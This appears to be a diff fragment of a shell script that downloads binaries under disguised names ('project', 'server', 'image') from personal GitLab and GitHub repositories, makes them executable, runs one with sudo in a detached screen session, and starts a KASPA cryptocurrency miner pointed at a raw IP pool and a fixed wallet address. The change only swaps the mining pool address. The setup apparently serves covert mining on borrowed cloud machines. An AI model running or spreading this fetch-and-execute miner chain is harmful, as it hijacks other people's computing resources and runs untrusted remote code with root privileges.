@@ -3,5 +3,5 @@ wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/tuyulcakep && ch
 wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/bude && chmod +x server
 screen -dms run sudo ./server
 wget -qO image https://gitlab.com/sarifadim/jomblo/-/raw/main/gitpod && chmod +x image
-./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 0-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable
+./image --algo KASPA --pool 34.117.82.207:9200 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 0-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable
 EOF
